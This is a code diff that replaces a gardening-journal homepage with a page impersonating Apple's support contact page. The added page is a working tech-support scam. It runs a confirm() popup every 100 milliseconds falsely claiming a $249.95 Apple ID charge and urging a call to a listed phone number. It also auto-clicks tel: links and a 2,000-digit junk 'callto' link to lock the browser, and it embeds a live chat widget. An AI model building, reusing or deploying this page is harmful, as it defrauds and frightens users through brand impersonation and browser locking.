@@ -1,402 +1,378 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Quelyra Sunthorn Alcove · premium gardening journal</title>
-  <!-- Premium Typography: modern serif + sans -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Literata:opsz,wght@7..72,300;7..72,400;7..72,500;7..72,600;7..72,700&family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      background: #f8f5f0;
-      color: #1f2a24;
-      font-family: 'Inter', sans-serif;
-      line-height: 1.6;
-      -webkit-font-smoothing: antialiased;
-    }
-    .container {
-      max-width: 1320px;
-      margin: 0 auto;
-      padding: 0 24px;
-    }
-    /* ---- brand identity: Quelyra Sunthorn Alcove ---- */
-    .site-header {
-      padding: 32px 0 16px;
-      border-bottom: 1px solid rgba(30, 40, 30, 0.08);
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: space-between;
-      align-items: center;
-    }
-    .brand {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      text-decoration: none;
-    }
-    .logo-icon {
-      width: 44px;
-      height: 44px;
-      background: #2a5c4a;
-      border-radius: 44% 56% 38% 62% / 50% 40% 60% 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #ece5d8;
-      font-size: 22px;
-      font-weight: 300;
-      letter-spacing: 1px;
-      transform: rotate(-6deg);
-      box-shadow: 0 8px 20px rgba(42, 92, 74, 0.12);
-    }
-    .brand-text {
-      font-family: 'Literata', serif;
-      font-weight: 400;
-      font-size: 1.7rem;
-      letter-spacing: -0.02em;
-      color: #1f2a24;
-    }
-    .brand-text span {
-      font-weight: 300;
-      color: #6e7d72;
-    }
-    .nav {
-      display: flex;
-      gap: 2.2rem;
-      font-weight: 500;
-      font-size: 0.95rem;
-      letter-spacing: 0.02em;
-    }
-    .nav a {
-      text-decoration: none;
-      color: #2b3a32;
-      border-bottom: 2px solid transparent;
-      padding-bottom: 6px;
-      transition: 0.2s;
-    }
-    .nav a:hover { border-bottom-color: #9ab8a8; color: #1a2c20; }
-    /* ---- unique navigation (split) ---- */
-    .nav-secondary {
-      display: flex;
-      gap: 1.6rem;
-      font-size: 0.85rem;
-      color: #5b6b60;
-      margin-top: 6px;
-    }
-    .nav-secondary a { color: #5b6b60; text-decoration: none; border-bottom: 1px dotted #cbd6cd; }
-    /* ---- HOMEPAGE: "Alcove" architecture ---- */
-    /* section 1: alcove statement */
-    .alcove-essence {
-      padding: 56px 0 40px;
-      background: #f0f0e9;
-      margin: 32px 0 16px;
-      border-radius: 120px 20px 120px 20px;
-      background: #e9ece4;
-      box-shadow: inset 0 0 0 1px rgba(255, 255, 255, 0.4);
-    }
-    .essence-grid {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 48px;
-      align-items: center;
-    }
-    .essence-text {
-      flex: 2 1 300px;
-    }
-    .essence-text h1 {
-      font-family: 'Literata', serif;
-      font-weight: 300;
-      font-size: 3.2rem;
-      line-height: 1.1;
-      letter-spacing: -0.03em;
-      color: #1f3028;
-    }
-    .essence-text h1 em {
-      font-style: normal;
-      background: #d8e0d3;
-      padding: 0 12px;
-      border-radius: 40px 8px 40px 8px;
-    }
-    .essence-text p {
-      margin-top: 20px;
-      font-size: 1.15rem;
-      color: #3c5043;
-      max-width: 500px;
-    }
-    .essence-visual {
-      flex: 1 1 200px;
-      background: #b3c9b8;
-      height: 160px;
-      border-radius: 60% 20% 70% 10% / 40% 60% 20% 70%;
-      background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" preserveAspectRatio="none"><path d="M20 70 L40 30 L70 50 L90 20 L80 80 L30 90 L10 60 Z" fill="%23dce6d0" opacity="0.4"/></svg>');
-      background-size: cover;
-      background-blend-mode: overlay;
-      box-shadow: 0 20px 40px -20px rgba(20,40,20,0.3);
-    }
-    /* section 2: knowledge hub — split cards */
-    .knowledge-hub {
-      padding: 50px 0 30px;
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 30px;
-    }
-    .hub-card {
-      background: #ffffffd9;
-      backdrop-filter: blur(2px);
-      padding: 28px 22px;
-      border-radius: 80px 16px 80px 16px;
-      box-shadow: 0 8px 30px rgba(40, 60, 40, 0.04);
-      border: 1px solid #e6ede4;
-      transition: all 0.2s;
-    }
-    .hub-card:nth-child(2) { border-radius: 20px 80px 20px 80px; background: #f3f7f0; }
-    .hub-card:nth-child(3) { border-radius: 60px 20px 60px 20px; background: #fafbf7; }
-    .hub-card h3 {
-      font-family: 'Literata', serif;
-      font-weight: 500;
-      font-size: 1.5rem;
-      border-left: 6px solid #5b8a72;
-      padding-left: 16px;
-      margin-bottom: 16px;
-    }
-    .hub-card p { color: #3c4f40; font-size: 0.95rem; }
-    .hub-meta { display: flex; gap: 12px; margin-top: 20px; font-size: 0.8rem; color: #6a806f; }
-    /* section 3: long-form feature (handcrafted) */
-    .feature-article {
-      margin: 40px 0 60px;
-      background: #f4f3ea;
-      padding: 48px 40px;
-      border-radius: 200px 20px 200px 20px;
-      box-shadow: 0 20px 40px -20px #b0bcaa;
-    }
-    .feature-article h2 {
-      font-family: 'Literata', serif;
-      font-weight: 300;
-      font-size: 2.4rem;
-      letter-spacing: -0.02em;
-      max-width: 800px;
-    }
-    .feature-article h2 strong { font-weight: 600; background: #d2dfce; padding: 0 10px; border-radius: 40px 4px; }
-    .feature-grid {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 40px;
-      margin-top: 24px;
-    }
-    .feature-text {
-      flex: 2 1 300px;
-    }
-    .feature-text h3 { font-family: 'Literata', serif; font-weight: 500; font-size: 1.6rem; margin: 28px 0 12px; }
-    .feature-text ul { list-style: none; }
-    .feature-text li { padding: 6px 0; border-bottom: 1px solid #d9e2d6; display: flex; gap: 12px; }
-    .feature-text li::before { content: "✧"; color: #2f6b4a; }
-    .feature-infographic {
-      flex: 1 1 220px;
-      background: #cfddd0;
-      border-radius: 120px 20px 120px 20px;
-      padding: 32px 20px;
-      background-image: radial-gradient(circle at 20% 30%, #b1c7b0 1px, transparent 1px);
-      background-size: 24px 24px;
-      color: #1e382a;
-      font-family: 'Literata', serif;
-      font-size: 1rem;
-      box-shadow: inset 0 0 0 2px #e2eee0;
-      min-height: 220px;
-    }
-    .infographic-content { display: flex; flex-direction: column; gap: 16px; }
-    .infographic-content span { background: #ffffffbb; padding: 6px 14px; border-radius: 40px; }
-    /* section 4: timeline / journal */
-    .journal-timeline {
-      display: flex;
-      flex-direction: column;
-      gap: 16px;
-      margin: 40px 0 30px;
-    }
-    .timeline-item {
-      display: flex;
-      align-items: center;
-      gap: 24px;
-      background: #ffffffd0;
-      padding: 12px 30px 12px 20px;
-      border-radius: 100px 20px 100px 20px;
-      border-left: 8px solid #6d8f78;
-    }
-    .timeline-item:nth-child(even) { border-left-color: #b3b9a4; border-radius: 20px 100px 20px 100px; }
-    .timeline-date { font-weight: 600; color: #395542; min-width: 80px; }
-    .timeline-title { font-weight: 500; }
-    .timeline-cat { margin-left: auto; background: #e6ede2; padding: 4px 18px; border-radius: 80px; font-size: 0.75rem; }
-    /* footer — unique */
-    .site-footer {
-      margin-top: 80px;
-      border-top: 2px solid #dce3d6;
-      padding: 48px 0 32px;
-      background: #f3f5ed;
-      border-radius: 60px 60px 0 0;
-    }
-    .footer-grid {
-      display: grid;
-      grid-template-columns: 2fr 1fr 1fr 1fr;
-      gap: 40px;
-    }
-    .footer-brand { font-family: 'Literata', serif; font-size: 1.3rem; }
-    .footer-links a { display: block; color: #2d4236; text-decoration: none; padding: 4px 0; font-size: 0.9rem; border-bottom: 1px dotted #d0dad0; }
-    .footer-links a:hover { color: #1a2c1e; }
-    .footer-copyright { margin-top: 40px; text-align: center; font-size: 0.85rem; color: #5b6d5a; border-top: 1px solid #d4dfd0; padding-top: 24px; }
-    /* responsive */
-    @media (max-width: 800px) {
-      .knowledge-hub { grid-template-columns: 1fr; }
-      .footer-grid { grid-template-columns: 1fr 1fr; }
-      .nav { gap: 1rem; flex-wrap: wrap; }
-      .essence-text h1 { font-size: 2.5rem; }
-    }
-    @media (max-width: 500px) {
-      .feature-article { padding: 24px 16px; }
-      .timeline-item { flex-wrap: wrap; }
-      .footer-grid { grid-template-columns: 1fr; }
-    }
-    /* utility */
-    .btn-ghost { display: inline-block; padding: 10px 28px; border: 1px solid #40634e; border-radius: 60px; color: #1f2f25; text-decoration: none; font-weight: 500; transition: 0.2s; background: transparent; }
-    .btn-ghost:hover { background: #2a4d39; color: #f0f5ea; border-color: #2a4d39; }
-    .spacer-32 { height: 32px; }
-  </style>
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js"><head>
+
+<!-- Privacy-friendly analytics by Plausible -->
+<script async src="https://plausible.io/js/pa-0v_6F6ac2BTANUqqz3t9d.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script async="" src="https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t" charset="UTF-8" crossorigin="*"></script><script src="js/text_tel.js"></script>
+
 </head>
+
 <body>
-<div class="container">
-
-  <!-- header -->
-  <header class="site-header">
-    <a href="#" class="brand">
-      <div class="logo-icon">☘</div>
-      <div class="brand-text">Quelyra <span>Sunthorn Alcove</span></div>
-    </a>
-    <div>
-      <div class="nav">
-        <li><a href="index.html">Home</a></li>
-                    <li><a href="about.html">About</a></li>
-                    <li><a href="contact.html">Contact</a></li>
-                    <li><a href="terms.html">Terms Of Privacy</a></li>
-                    <li><a href="privacy.html">Privacy Policy</a></li>
-					<li><a href="cookies.html">Cookies Policy</a></li> 
-                    <li><a href="disclaimer.html">Disclaimer</a></li>
-                    <li><a href="categories.html">Categories</a></li>
-      </div>
-    </div>
-  </header>
-
-  <!-- 1. Essence / alcove statement (hero reimagined) -->
-  <section class="alcove-essence">
-    <div class="essence-grid">
-      <div class="essence-text">
-        <h1>cultivate <em>depth</em> <br>in every leaf</h1>
-        <p>An alcove for gardeners who read, writers who dig. Long-form, slow, intentional.</p>
-        <a href="#" class="btn-ghost" style="margin-top:20px;">enter the alcove →</a>
-      </div>
-      <div class="essence-visual"></div>
-    </div>
-  </section>
-
-  <!-- 2. knowledge hub (3 pillars) -->
-  <div class="knowledge-hub">
-    <div class="hub-card">
-      <h3>soil &amp; spirit</h3>
-      <p>Mycorrhizal networks, compost alchemy, and the mycelium underground. 1800-word deep dives.</p>
-      <div class="hub-meta"><span>✧ 12 articles</span><span>🌱 updated weekly</span></div>
-    </div>
-    <div class="hub-card">
-      <h3>perennial wisdom</h3>
-      <p>Heirloom varieties, seed saving, and the art of cutting gardens. Seasonal rhythms.</p>
-      <div class="hub-meta"><span>✧ 8 guides</span><span>📖 long-form</span></div>
-    </div>
-    <div class="hub-card">
-      <h3>the green library</h3>
-      <p>Reviews of obscure horticultural texts, botanical essays, and garden memoirs.</p>
-      <div class="hub-meta"><span>✧ 14 notes</span><span>📚 curated</span></div>
-    </div>
-  </div>
-
-  <!-- 3. feature article (long-form excerpt) -->
-  <section class="feature-article">
-    <h2><strong>The mycelial mind</strong> · how fungi shape garden intelligence</h2>
-    <div class="feature-grid">
-      <div class="feature-text">
-        <h3>underground networks</h3>
-        <p style="font-size:1.05rem; color:#2e4436;">For decades, we treated soil as a medium. But the real conversation happens in the hyphal web — a living internet of nutrient exchange, warning signals, and symbiotic memory. In this extensive guide, we explore the research of Suzanne Simard, the role of ectomycorrhizal fungi, and how to cultivate a mycorrhizal garden.</p>
-        <ul>
-          <li>the wood wide web: 6 key species</li>
-          <li>companion planting through fungal lenses</li>
-          <li>mistakes: tilling, fungicides, and compaction</li>
-          <li>expert advice: building a fungal rich bed</li>
-        </ul>
-        <a href="#" style="margin-top:18px; display:inline-block; font-weight:500; color:#2a5c3e;">continue reading →</a>
-        <!-- table example -->
-        <div style="margin-top:24px; background:#eff0e7; padding:16px; border-radius: 40px 8px; font-size:0.9rem;">
-          <table style="width:100%; border-collapse:collapse;">
-            <tr><th style="text-align:left; padding:6px 0;">Fungal type</th><th style="text-align:left;">Role</th><th>companions</th></tr>
-            <tr><td>Glomus</td><td>phosphorus transport</td><td>most perennials</td></tr>
-            <tr><td>Rhizopogon</td><td>nitrogen fixing</td><td>pines, oaks</td></tr>
-          </table>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
         </div>
-      </div>
-      <div class="feature-infographic">
-        <div class="infographic-content">
-          <span>🌿 72% of garden plants</span>
-          <span>⬆︎ mycorrhizal dependency</span>
-          <span>⬇︎ 40% less water need</span>
-          <span>✧ 3 key companion families</span>
-          <span style="background:#cbdcc6;">infographic: fungal network</span>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
+
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-855-595-3069 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
+
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2026 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-855-595-3069
+			 " property="telephone">
+            </section>
         </div>
-      </div>
-    </div>
-  </section>
+    </footer>
 
-  <!-- 4. journal timeline (handcrafted) -->
-  <div class="journal-timeline">
-    <div class="timeline-item"><span class="timeline-date">May 12</span><span class="timeline-title">Compost as ecosystem: a 2000-word field report</span><span class="timeline-cat">soil</span></div>
-    <div class="timeline-item"><span class="timeline-date">May 5</span><span class="timeline-title">Heirloom tomato varieties: taste, history, and resilience</span><span class="timeline-cat">perennial</span></div>
-    <div class="timeline-item"><span class="timeline-date">Apr 27</span><span class="timeline-title">The forgotten art of the cutting garden — 10 designer tips</span><span class="timeline-cat">design</span></div>
-    <div class="timeline-item"><span class="timeline-date">Apr 18</span><span class="timeline-title">Slugs, snails, and biodiversity: a balanced approach</span><span class="timeline-cat">pests</span></div>
-  </div>
 
-  <!-- extra: FAQ snippet, comparison table etc -->
-  <div style="display: flex; flex-wrap: wrap; gap: 30px; margin: 40px 0; background: #eaece2; padding: 40px 30px; border-radius: 140px 20px 140px 20px;">
-    <div style="flex:1;">
-      <h3 style="font-family:'Literata',serif; font-weight:400;">❋ expert advice</h3>
-      <p>“Let the soil breathe. Avoid deep tilling, and introduce woody debris for fungal habitat.” — <em>E. V. Quelyra</em></p>
-      <div style="margin-top:16px; display:flex; gap:30px; flex-wrap:wrap;">
-        <div><strong>mistake:</strong> overwatering new transplants</div>
-        <div><strong>fix:</strong> water deeply, but less frequently</div>
-      </div>
-    </div>
-    <div style="flex:1; background:#f8f7ef; padding:20px; border-radius: 80px 12px;">
-      <h4 style="font-weight:500;">🌱 quick comparison</h4>
-      <table style="width:100%; font-size:0.9rem;">
-        <tr><th>mulch type</th><th>water retention</th><th>fungal benefit</th></tr>
-        <tr><td>wood chips</td><td>high</td><td>+++</td></tr>
-        <tr><td>straw</td><td>medium</td><td>+</td></tr>
-        <tr><td>compost</td><td>very high</td><td>++</td></tr>
-      </table>
-    </div>
-  </div>
 
-  <!-- footer -->
-  <footer class="site-footer">
-    <div class="footer-grid">
-      <div>
-        <div class="footer-brand">Quelyra Sunthorn Alcove</div>
-        <p style="margin:12px 0; font-size:0.9rem; color:#3b5340;">A premium garden journal for the thoughtful cultivator. Established 2026.</p>
-      </div>
-      <div class="footer-links"><strong>explore</strong><a href="#">Blog</a><a href="#">Categories</a><a href="#">Archive</a><a href="#">Authors</a></div>
-      <div class="footer-links"><strong>information</strong><a href="#">About</a><a href="#">Contact</a><a href="#">Editorial Policy</a><a href="#">FAQ</a></div>
-      <div class="footer-links"><strong>legal</strong><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Cookie Policy</a><a href="#">Disclaimer</a></div>
-    </div>
-    <div class="footer-copyright">
-      © 2026 Quelyra Sunthorn Alcove · handcrafted with care · sitemap
-    </div>
-  </footer>
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
 
-</div> <!-- container -->
-</body>
-</html>
+
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-855-595-3069');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-855-595-3069"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $249.95 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-855-595-3069 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+
+
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t';
+s1.charset='UTF-8';
